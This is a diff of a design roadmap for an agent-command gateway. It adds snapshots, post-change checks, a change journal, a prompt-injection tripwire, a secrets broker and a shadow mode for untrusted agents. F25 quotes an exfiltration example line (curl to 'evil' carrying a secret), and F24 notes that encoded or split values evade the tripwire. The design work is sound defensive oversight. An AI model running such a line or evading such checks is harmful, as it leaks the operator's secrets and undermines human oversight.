@@ -48,6 +48,13 @@ dashboard LXC or any gateway until the rollout gate in § 8 passes.**
 | F16 | Reviewed, parameterised scripts ("recipes") any agent can run with one approval, often drafted from F13 runbooks |
 | F17 | A ready-made setup for a local model in LM Studio: its own token, a small toolset, and a hand-off to Hermes |
 | F19 | Commands that run with nobody watching (read lane, probes, read-only recipes) get a hard time limit and output cap on the gateway |
+| F21 | Before a risky change inside a Proxmox guest, Eshu can take a snapshot first; one click rolls it back, and old snapshots expire |
+| F22 | Each change in a plan can carry a check ("the service is running"); Eshu runs it right after the change and stops the plan if it fails |
+| F23 | A per-host timeline of what Eshu changed, with that host's alerts next to it ("this alert started 4 minutes after request X") |
+| F24 | Warns on the approval card when a write uses a value the agent first saw in untrusted content (a web page, a log line) |
+| F25 | Named secrets per host: a command refers to a key by name, the gateway fills it in, and the agent never sees the value |
+| F26 | Try a new agent or model in shadow mode: its writes are recorded, never run, and compared with what you really approved |
+| F20 | Reserved: the local-agent pass, parked on a local branch until the end |
 
 ## 1. Why — what the live data says
 
@@ -7892,7 +7899,13 @@ confirmed runbooks), and it is left as it is.
 
 ---
 
-## Chunks F14–F17 — Local-model support
+## Chunks F14–F17 — Structured tools (all agents) and local-model support
+
+**Re-scoped 2026-11-10.** F14–F16 are main-line work, not only local-model
+support: probes and recipes cut approval prompts for every agent, Hermes
+included, because free-form read shell rarely fits the read lane. They are
+ordered with the main line in § 9. Only F17 (and the parked F20) is the
+local-model experiment, and it goes last.
 
 Goal: let a small local model (e.g. a 14–20B model in LM Studio on a 16 GB GPU)
 handle routine homelab support by moving the intelligence to **authoring time**:
@@ -8703,6 +8716,555 @@ _(reviewer)_
 
 ---
 
+## Chunks F21–F26 — Safer changes, change history, agent trust
+
+Added 2026-11-10 from a separate review chat. They go ahead of the
+local-model work (F17 and the parked F20), which is now an experiment and
+comes last. Shared rules:
+
+* **Every read goes through `core/read_policy.py`** (§ 2.6a), as in F14–F16.
+* **Anything that runs with no human click** is an unattended run. It gets
+  F19's limits, and it runs only on a gateway that reports `run_limits: v1`.
+  On any other gateway it does not run, and the card says "not run", never
+  "passed".
+* **"Operator-approved exact bytes" is one rule, not one per feature.** F15
+  (AG1), F16 (V5) and F22 each need a command the operator approved once to
+  run without a second prompt, even for an agent whose SSH mode is
+  `approval`. The security reviewer decides that rule once, on F15's AG1.
+  F16 and F22 reuse it and do not invent their own.
+* **No live data** in tests or fixtures (§ 2.5): TEST-NET addresses, made-up
+  vmids and names.
+
+---
+
+## Chunk F21 — Snapshot before approve · slug `snapshot-approve` · dashboard + Proxmox integration · **design first + security reviewer sign-off**
+
+### Goal
+
+When a write is about to run inside a Proxmox guest, the operator can choose
+"snapshot, then run". If it goes wrong, one click rolls the guest back.
+
+### Design (to confirm in the design note)
+
+* **When it is offered.** Only on a pending write request (F1 has at least
+  one write or unknown step) whose real target is a single Proxmox guest:
+  * the F7 inner target is `pct exec <vmid>` / `qm guest exec <vmid>` on a
+    gateway that is a Proxmox node; or
+  * the gateway itself is a guest. F14's inventory maps the gateway's IP to
+    exactly one Proxmox row (`source='proxmox'`, a `vmid`). Zero or several
+    matches mean no offer, with the reason shown.
+
+  The guest's node comes from `get_cluster_resources`, read through
+  `read_policy`. Proxmox host commands with no inner target get no offer: a
+  snapshot would not cover them.
+* **New Proxmox tools, not agent tools.** `snapshot_create`, `snapshot_list`,
+  `snapshot_rollback` and `snapshot_delete` cover `qemu` and `lxc`:
+  * `POST/GET /nodes/{node}/{type}/{vmid}/snapshot`;
+  * `POST …/snapshot/{name}/rollback`;
+  * `DELETE …/snapshot/{name}`.
+
+  They are seeded `internal: 1`. The MCP server never lists them, and
+  `run_tool` refuses them for every agent, including through a hidden-tool
+  call and the generic integration proxy. Only dashboard code paths run
+  them. A test calls each one as an agent and gets a refusal.
+* **"Snapshot, then run".** A second approve button.
+  1. The dashboard creates the snapshot:
+     * the name is `eshu-r<request id>-<unix ts>`;
+     * the description is `eshu request #N` plus the scrubbed first 80
+       characters of the command;
+     * `vmstate` is 0.
+  2. It polls the task's UPID until it finishes, with a time limit (default
+     120 s).
+  3. Only after the task succeeds does it approve the request.
+  4. If the snapshot fails or times out, the request stays **pending**, the
+     error is shown, and the operator can still approve without one. A
+     failed snapshot never approves anything.
+* **Recorded.** A new `snapshots` table:
+  * `request_id` / `plan_id`, `node`, `type`, `vmid`, `name`;
+  * `created_at`, `expires_at`;
+  * `state`: `active|rolled_back|deleted|expired|failed`;
+  * the operator.
+
+  The approval card and the request sidebar show it, with "Roll back" and
+  "Delete".
+* **Rollback and delete are operator-only.**
+  * A session-authenticated dashboard user only, CSRF-checked like every
+    other operator POST; never an agent token.
+  * A confirm dialog names the guest, says that the guest's disk returns to
+    the snapshot time, and that a running LXC is stopped and started again.
+  * Each action is audited.
+  * Before acting, the dashboard re-reads the snapshot list and checks that
+    a snapshot with that name and the eshu description still exists on that
+    vmid. This guards against vmid reuse (the F16 V4 lesson).
+* **Expiry.** A background job deletes snapshots past `expires_at`:
+  * the default is 72 h, and the setting ranges over 1 h–14 d;
+  * it deletes only rows in its own table that pass the same re-check, so
+    it can never delete a snapshot it did not make.
+
+  Thin-pool space: if `list_storages` reports the guest's storage above 85 %
+  used, the offer is shown with a warning (or hidden, if the design note
+  prefers).
+* **Freeze.** While frozen, no approval happens, so no snapshot is created.
+  Whether rollback stays available during a freeze (it is the recovery
+  button) is for the security reviewer to decide in the design note.
+* **Permissions.** The Proxmox token needs `VM.Snapshot`, and
+  `VM.Snapshot.Rollback` on PVE 8. A missing privilege shows on the
+  integration page as "snapshots unavailable", never as a failed approval.
+
+### Tests to add (outline)
+
+* The offer:
+  * an inner-target `pct exec` gets it;
+  * a gateway mapped to one guest gets it;
+  * zero or two inventory matches, or a Proxmox host command with no inner
+    target, do not.
+* Snapshot failure leaves the request pending; approval follows only a
+  finished task.
+* The four tools are refused to agents on every path.
+* Rollback and delete:
+  * an agent token, a missing CSRF token, or a snapshot that is gone or
+    renamed on the vmid each give a refusal and touch nothing;
+  * a reused vmid is caught by the re-check.
+* Expiry deletes only its own expired rows.
+* A stubbed Proxmox API throughout.
+
+### Compat impact
+
+Additive: a table, settings, and seeded internal tools. Integrations without
+the new tools show no offer. No gateway change.
+
+### Acceptance criteria
+
+The design note is signed off by the security reviewer; the tests above
+pass; on a test guest, snapshot → run → roll back → the guest is back to its
+snapshot state; and an expired snapshot is deleted by the job.
+
+### Implementer notes
+
+_(implementer)_
+
+### Reviewer notes
+
+_(reviewer)_
+
+---
+
+## Chunk F22 — Changes carry a check · slug `change-checks` · dashboard + MCP · **security reviewer signs off the unattended check**
+
+### Goal
+
+Each change in a plan can say how to tell that it worked: "the unit is
+active", "port 443 is listening". Eshu runs that check right after the
+change and stops the plan if it fails.
+
+### Design (to confirm in the design note)
+
+* **A plan item may carry one `check`.** It is proposed with the item, shown
+  on the plan card, and approved with it. There are two kinds:
+  * `{kind: 'ssh', command}`: run on the item's host. It must pass
+    `is_read_ssh` when proposed **and** again when it runs. Success is exit
+    code 0.
+  * `{kind: 'tool', integration, tool, args, expect: {path, op, value}}`:
+    it must pass `is_read_integration_call`. The rest is fixed:
+    * `path` is a dotted JSON path of at most 4 parts;
+    * `op` is one of `eq|ne|in|lt|gt`;
+    * `value` is a string or number.
+
+    It is never a regex and never prose parsing.
+
+  Optional `wait_s` 0–30 and `retries` 0–3 cover services that take a moment
+  to start.
+* **When it runs.** The item's command reports its exit code (F5; this works
+  with `exit-only` capture). Then:
+  * a non-zero exit stops the plan with no check;
+  * an exit of 0 schedules the check.
+* **Who runs it.**
+  * An `ssh` check runs through the F12 runner under the item's agent, with
+    reason `plan-check:<plan>:<item>`, and with F19's limits.
+  * It is covered by the "operator-approved exact bytes" rule (see the
+    shared rules; F15's AG1) and needs no second click.
+  * On a gateway without `run_limits: v1`, the check is "not run", and the
+    plan pauses for the operator (not "passed").
+  * A `tool` check runs dashboard-side through `run_tool`'s read path.
+* **Result.** It is stored per item as `check_state`:
+  `passed|failed|not_run|skipped`, with the exit code or the compared value,
+  never the output.
+  * The session card and the plan view show it per change.
+  * A failed or not-run check stops the plan: the remaining items can no
+    longer be claimed (the plan status is `stopped`, and it is audited).
+  * The agent sees this in `session_plan` / `session_summary`, with the
+    failed check named.
+* **No new write path.** A check can only read. If it is not a read when it
+  runs (the policy changed, or the tool was reconfigured), it is `not_run`
+  and the plan stops.
+
+### Tests to add (outline)
+
+* A write as a check is refused at proposal.
+* A check that stops being a read before it runs ends as `not_run`, and the
+  plan stops.
+* Pass and fail by exit code, and by each `op`.
+* A failed item stops the plan before its check runs.
+* A failed check makes the next item unclaimable through the real
+  `receive_request`.
+* A gateway without `run_limits` gives `not_run`.
+* `wait_s`/`retries` are bounded, and an out-of-range value is refused.
+* The check is not run twice after a dashboard restart.
+
+### Compat impact
+
+Additive: optional columns on `session_plan_items` (`check_json`,
+`check_state`, `check_detail`). Plans without checks behave exactly as now.
+
+### Acceptance criteria
+
+The tests above pass; the security reviewer has signed off the unattended
+check path; and on a test gateway, a plan that restarts a unit with an
+`is-active` check shows "passed", and one with a broken unit stops at that
+item.
+
+### Implementer notes
+
+_(implementer)_
+
+### Reviewer notes
+
+_(reviewer)_
+
+---
+
+## Chunk F23 — Change journal tied to alerts · slug `change-journal` · dashboard only
+
+### Goal
+
+A per-host timeline of what Eshu changed, with that host's Pulse alerts next
+to it. It shows things like "this alert started four minutes after request
+#1234".
+
+### Design
+
+* **Sources, all read-only.**
+  * Requests on the host, including the rows whose F7 inner target is a
+    guest on it:
+    * the rows that ran (`approved`/`consumed`) and that F1 labels as having
+      a write or unknown step;
+    * with their F5 exit code and their session.
+  * Integration writes from the audit log (F10 actions, NPM and Proxmox
+    writes, F21 snapshots and rollbacks), mapped to a host through F14's
+    inventory.
+  * Pulse alerts (`list_alerts`, `scope=history`) for the resources that
+    F14's inventory maps to the host (by IP or by vmid). This is read
+    through `read_policy`, the same way as `core.inventory._call_tool`.
+* **View.** A "Changes" tab on the host page, plus a link from a request's
+  sidebar:
+  * one timeline with the last 7 days by default (a 1–30 day range);
+  * changes and alerts are shown with different marks;
+  * commands are shown through `scrub_string`, capped at 120 characters,
+    and the full text is in the sidebar.
+* **Tie-in.** An alert that **started** within 30 minutes after a change on
+  the same host gets a badge naming the change and the gap ("+4 min after
+  #1234"). If several changes came before it, the nearest one is named and
+  the rest are counted. This is shown as a hint; Eshu never states it as a
+  cause.
+* **Cost.** Pulse is read once per view and cached for 60 s. If Pulse is
+  missing or errors, the timeline still shows the changes, with "alerts
+  unavailable".
+* **API.** `GET /api/hosts/{ip}/changes?days=N` returns JSON, for the
+  operator only. It is not an MCP tool in this chunk; a later chunk can add
+  an agent tool.
+
+### Tests to add (outline)
+
+* A write on the host appears; a read, another host's write, and a
+  row that never ran do not.
+* An inner-target write on a guest shows on that guest's host.
+* An alert 4 minutes after a change gets the badge; one 40 minutes after,
+  or one before the change, does not.
+* Pulse down still shows changes.
+* Commands are scrubbed.
+* The Pulse read is refused if the tool is reconfigured as a non-read.
+
+### Compat impact
+
+Read-only. No migration beyond an optional index on
+`requests(target_ip, created_at)` if the design note measures a need for one
+on the live-DB copy.
+
+### Acceptance criteria
+
+The tests pass, and on the private live-DB copy the page builds for the
+busiest host in under 1 s (measured, kept out of the repo).
+
+### Implementer notes
+
+_(implementer)_
+
+### Reviewer notes
+
+_(reviewer)_
+
+---
+
+## Chunk F24 — Untrusted-content tripwire · slug `content-tripwire` · dashboard · **design first + security reviewer sign-off**
+
+### Goal
+
+Content an agent reads is untrusted: a web page, a log line, a device name.
+When a later write request uses a value that first appeared in that content,
+the approval card says so. This catches the shape of a prompt injection
+without blocking anything.
+
+### Design (to confirm in the design note)
+
+* **Collect.** For each session, take what Eshu returns to the agent:
+  * F12 `ssh_exec` output;
+  * integration read bodies;
+  * `web_fetch` results;
+  * F15 digests.
+
+  From these, extract **candidate values**:
+  * IPs, hostnames and FQDNs, URLs, absolute paths, e-mail-like strings;
+  * any other run of at least 12 characters without spaces.
+
+  Store a keyed hash of each one, never the value:
+  * HMAC-SHA256 with a per-install key kept beside the session key;
+  * stored per session, with the source kind and the time first seen.
+* **Compare.** When a write request or a write tool call arrives in that
+  session, extract the same candidate values from its command or
+  arguments, hash them with the same key, and look them up. A hit flags the
+  request when the value:
+  * was first seen in untrusted content;
+  * was not in the operator's own plan text (an F3 plan, or an F11 diff the
+    operator saw);
+  * is not on the host's inventory record (F14). A value Eshu already knows
+    is not suspicious.
+* **Show, never block.** The card shows a yellow line, "this value first
+  appeared in `web_fetch` output 6 min ago", and the audit row records the
+  flag. Nothing is denied or delayed. The design note must keep this
+  promise, and must say how a flag stays useful without becoming noise.
+  The live data shows that the operator approves quickly; a measured flag
+  rate on the live-DB copy is part of the note.
+* **Retention.** The design note fixes:
+  * what is stored: hashes only, the source kind, and timestamps;
+  * the per-session caps (for example 5,000 hashes, oldest dropped first);
+  * the lifetime: the session's end + 24 h, then deleted by a job;
+  * that the HMAC key never leaves the dashboard host and is not in any
+    backup export.
+* **Threat model** (in the note): an injection that rewrites a value
+  (encoding, splitting) evades this. It is a tripwire for the common case,
+  not a guarantee, and the card text must not oversell it.
+
+### Tests to add (outline)
+
+* A URL first seen in `web_fetch` output and then used in a write command
+  is flagged.
+* The same URL in the operator's plan text is not flagged.
+* An inventory IP is not flagged.
+* A read is never flagged.
+* No raw value is stored: the table holds only hashes.
+* Expiry deletes the session's rows.
+* The cap drops the oldest hashes.
+* A flag never changes the request's status.
+
+### Compat impact
+
+Additive: one table and a background job. Nothing is blocked.
+
+### Acceptance criteria
+
+The design is signed off by the security reviewer, including the retention
+section; the tests pass; and the flag rate on the private live-DB copy is
+measured and reported (outside the repo).
+
+### Implementer notes
+
+_(implementer)_
+
+### Reviewer notes
+
+_(reviewer)_
+
+---
+
+## Chunk F25 — Secrets broker · slug `secrets-broker` · gateway + dashboard · **design first + security reviewer sign-off**
+
+### Goal
+
+Live traffic includes commands that pull a key out of a container into a
+shell variable, so that the agent sees the key. With a broker, the operator
+registers a named credential per host, and a command refers to it by name.
+The gateway puts the value in at run time, so the agent never sees it, and
+the output is scrubbed for it.
+
+### Design questions the note must answer
+
+* **Where the value lives.** The preferred option is on the gateway host
+  only:
+  * a root-owned `0600` file under `/etc/eshu/secrets/<name>`;
+  * or a registered source on that host, such as a fixed file inside a
+    named container, read by the gateway at run time.
+
+  The dashboard stores only the name, the host, a description, and a hash
+  for "has it changed". Storing the value on the dashboard and shipping it
+  per run is the alternative. The note must weigh it (an encrypted-at-rest
+  store, transport, and the dashboard as a single point of compromise) and
+  say why it was or was not chosen.
+* **How a command refers to it.**
+  * One fixed form, for example the word `@eshu-secret:<name>` standing
+    alone, resolved by the gateway into an environment variable that the
+    command reads as `"$ESHU_SECRET_<NAME>"`.
+  * It is never placed in argv. Any local user can read argv through
+    `/proc` (the F19 AF3 lesson).
+  * F1 labels the reference.
+  * F16's V1 rule applies: a reference is never a command word, and never
+    an argument of an exec-type verb.
+* **Approval.**
+  * The card shows each secret a command uses, in red.
+  * A command that uses a secret never runs unattended: no read lane, no
+    probe, and no F22 check. It runs only as a human-approved request or as
+    an approved plan item.
+  * Each secret may carry an allowlist of hosts it can be used on. The note
+    decides whether to add a per-secret allowlist of destinations (to stop
+    `curl evil -d "$ESHU_SECRET_X"`), and how that would be enforced.
+* **Output scrubbing.** The gateway scrubs the exact value, and its base64
+  and URL-encoded forms, from the output before `sanitize`. This uses a
+  fixed-string match, never a regex built from the value. A line that
+  contained the value is marked `[ESHU secret redacted]`.
+* **Logs.** The name may appear in Eshu's own audit log. The value must
+  never appear in:
+  * syslog (this needs security Chunk 7's no-sig-in-syslog fix first);
+  * the F5 result;
+  * the ticket;
+  * the lockbox file;
+  * the shell's own history.
+
+  The note lists each place a value could leak and how each is closed.
+* **Capability.** A new `secrets: v1` capability, reported per request as
+  F19 does. A gateway without it refuses any command with a reference.
+
+### Tests to add (outline)
+
+To be fixed in the design note. As a minimum:
+* the value never appears in argv, the F5 result, the ticket, the stored
+  output or any log;
+* the encoded forms are scrubbed;
+* a reference as a command word is refused;
+* an unknown name is refused;
+* a gateway without the capability refuses;
+* a secret-using command is never auto-run.
+
+### Compat impact
+
+New gateway code and a capability flag. Gateways without it refuse
+references, and all other commands behave as now.
+
+### Acceptance criteria
+
+The design note is signed off by the security reviewer; the gateway bash is
+reviewed line by line and re-signed off; and the tests pass under GNU and
+BusyBox (the F11 W5 matrix).
+
+### Implementer notes
+
+_(implementer)_
+
+### Reviewer notes
+
+_(reviewer)_
+
+---
+
+## Chunk F26 — Shadow mode for a new agent or model · slug `agent-shadow` · dashboard + MCP · **security reviewer reads the enforcement points**
+
+### Goal
+
+A new agent or model can be run for real while every write it attempts is
+recorded instead of run. The operator then compares what it would have done
+with what was really approved, and builds a track record before granting it
+anything.
+
+### Design
+
+* **A new agent-policy field, `shadow: 0|1`.** It is set by the operator,
+  and only on an agent whose SSH is MCP-only:
+  * it has no `ssh_hosts_allow` for direct SSH;
+  * its token is used only through `ssh_exec`.
+
+  A shadowed agent's direct-SSH use cannot be intercepted, so the design
+  refuses to enable shadow on an agent that has direct SSH access, and says
+  so.
+* **What changes for a shadowed agent.**
+  * **Reads behave as normal:**
+    * integration calls that pass `is_read_integration_call`;
+    * `ssh_exec` commands that pass `is_read_ssh`;
+    * F14 and F15.
+
+    They follow the agent's usual approval rules, so a read that would need
+    approval still does.
+  * **Everything else is recorded and not run:**
+    * integration writes, and calls `read_policy` does not class as reads;
+    * `ssh_exec` writes;
+    * F3 plans, F16 recipe runs, and F10/F11 actions.
+
+    Each is stored as a `shadow_calls` row with the agent, the session, the
+    tool or command, the arguments (scrubbed), the F1 breakdown, and what
+    Eshu's policy *would* have decided. That decision comes from the same
+    functions, called in dry form: blocked, freeze, needs approval, or plan
+    covered. Nothing reaches a gateway or an upstream API.
+  * **The agent is told.** The result is `{"status": "shadowed", "executed":
+    false, "message": "recorded only; this agent is in shadow mode"}`. Tool
+    descriptions for a shadowed agent carry one line saying so.
+* **Enforcement point.** There is one check, in `run_tool` and in
+  `ssh_exec`, before any upstream call. A test drives every write tool kind:
+  * HTTP and WS;
+  * handlers, including the ones `DRY_RUN_HANDLERS` exempts;
+  * the generic proxy;
+  * plans and recipes.
+
+  It asserts that nothing upstream is called. This is the part the security
+  reviewer reads.
+* **Compare.** A "Shadow" view per agent lists its recorded calls next to
+  the real requests that were approved on the same host in the same time
+  window, matched by F18's fingerprints (`command_sha`, `shape_sha`):
+  * **same as approved**;
+  * **similar shape**;
+  * **no match**;
+  * **would have been blocked**.
+
+  It also shows a summary count per category. Turning shadow off is an
+  ordinary policy edit, audited.
+
+### Tests to add (outline)
+
+* Every write path records and runs nothing upstream.
+* Reads run.
+* Shadow cannot be enabled on an agent with direct SSH.
+* The would-have decisions match the real ones for the same inputs.
+* The agent's result says `shadowed`.
+* A non-shadowed agent is unaffected.
+* The comparison categories on synthetic data.
+
+### Compat impact
+
+Additive: one policy column (default 0) and one table. Agents without shadow
+behave as now.
+
+### Acceptance criteria
+
+The tests pass; the security reviewer has read the enforcement points; and a
+test agent in shadow mode runs a short job in which every write shows in the
+Shadow view and nothing changed on the test host.
+
+### Implementer notes
+
+_(implementer)_
+
+### Reviewer notes
+
+_(reviewer)_
+
+---
+
 ## 7. Backlog (not planned in detail)
 
 * Deny with a reason, shown to the agent (cheap; low value given the data).
@@ -8748,12 +9310,23 @@ The implementer never deploys. The reviewer runs this gate (same shape as `docs/
 | 10 | F8 | test-traffic | dashboard | Merged | `feat/f8-test-traffic` | — | low priority |
 | 11 | F9 | ha-supervisor-read | dashboard | Merged | `feat/f9-ha-supervisor-read` | — | token is now a dedicated `eshu` HA admin user |
 | 12 | F10 | ha-supervisor-actions | dashboard | Merged (security sign-off `f9e2c22`) | `feat/f10-ha-supervisor-actions` | F9, F3, Chunk H | security re-reads the P1–P3 diff only |
-| 13 | F11 | ha-config-files | dashboard | **Round 7 (Z1–Z9) under review; AB1/AB2 to fold** (`81135a4`), then security for Z1–Z5 | `feat/f11-ha-config-files` | F10, F2, F5, F12 (runner) | then security reviewer on the design |
+| 13 | F11 | ha-config-files | dashboard | Design round 7 done (AE1 at `471f58f`); **to security for Z1–Z5** | `feat/f11-ha-config-files` | F10, F2, F5, F12 (runner) | then code |
 | 14 | F14 | inventory | dashboard + MCP | Merged | `feat/f14-inventory` | Chunk H | |
-| 15 | F15 | probes | dashboard + MCP | Ready after F12; pre-implementation notes P1–P8 | `feat/f15-probes` | F4, F12 | |
-| 16 | F16 | recipes | dashboard + MCP | **Security approved Round 4 with Y1 + W2**; Round 5 to feature reviewer only | `feat/f16-recipes` | F3, F12, F13 | security re-reads Round 4 only |
-| 17 | F17 | local-agent | dashboard + docs | Ready after F15; pre-implementation notes A1–A6 | `feat/f17-local-agent` | F12–F16 | |
-| 18 | F19 | unattended-limits | gateway + dashboard | **Design approved by security** (`d67ad02`); code after F12 merges (W1 at code time) | `feat/f19-unattended-limits` | F4, F5 | then security re-review of § 3 |
-| — | CI fix | ci-environment | gateway + tests | **Approved by feature reviewer** (round 5); CI green; **to security** (gateway bash) | `fix/ci-environment` | F5 | release precondition (`RELEASE_1.md`) |
+| 15 | F19 | unattended-limits | gateway + dashboard | Code approved by both reviewers on AF1/AF2 (security `67bec51`); feature reviewer checks AF1/AF2, then merge | `feat/f19-unattended-limits` | F4, F5, F12 | moved ahead of F21–F23: nearly done, and F22 needs it. AF3 goes on the next gateway branch |
+| 16 | F15 | probes | dashboard + MCP | Code round 1: changes requested AG1–AG7 (`56d86e3`); **AG1 to security** | `feat/f15-probes` | F4, F12, F14 | main line, not only local-model |
+| 17 | F21 | snapshot-approve | dashboard + Proxmox | Design first | `feat/f21-snapshot-approve` | F7, F14, F2 | + security sign-off (new write path, destructive rollback) |
+| 18 | F23 | change-journal | dashboard | Ready | `feat/f23-change-journal` | F1, F5, F7, F14 | no security gate; can be coded while F21's design is with security |
+| 19 | F22 | change-checks | dashboard + MCP | After F19 merges and F15's AG1 is decided | `feat/f22-change-checks` | F3, F5, F12, F19, F15 (AG1 rule) | + security sign-off (the unattended check) |
+| 20 | F16 | recipes | dashboard + MCP | Design complete (security Round 4; feature reviewer Round 5 with AA1/AA2); code next after F22 | `feat/f16-recipes` | F3, F12, F13, F19, F15 (AG1 rule) | main line; code comes back to security; auto_run comes back to security |
+| 21 | F24 | content-tripwire | dashboard | Design first | `feat/f24-content-tripwire` | F12, F14 | + security sign-off (retention) |
+| 22 | F25 | secrets-broker | gateway + dashboard | Design first | `feat/f25-secrets-broker` | F1, F12, F19; security Chunk 7 before deploy | + security sign-off; gateway bash line by line |
+| 23 | F26 | agent-shadow | dashboard + MCP | Ready after F16 | `feat/f26-agent-shadow` | F1, F12, F16, F18 | security reads the enforcement points |
+| 24 | F20 | local-agent-pass | docs | Parked | `docs/local-agent-pass` (local, unpushed) | — | experiment; last |
+| 25 | F17 | local-agent | dashboard + docs | After F20; pre-implementation notes A1–A6 | `feat/f17-local-agent` | F12–F16, F26 | experiment; last |
+| — | CI fix | ci-environment | gateway + tests | Merged (`f2746ef`); CI pinned to ubuntu-24.04 (`6d58006`) | `fix/ci-environment` | F5 | |
+| — | Buffering | stream-unbuffered | gateway | Merged (`d8d70c2`); S1 tee fix later | `fix/stream-unbuffered` | F5 | |
+
 Chunks are done **in the order column**; each new chunk branches from the
-updated `feature-roadmap` after the previous one is merged.
+updated `feature-roadmap` after the previous one is merged. A design-first
+chunk's design note may be written while the chunk before it is with a
+reviewer; its code still waits for its turn.
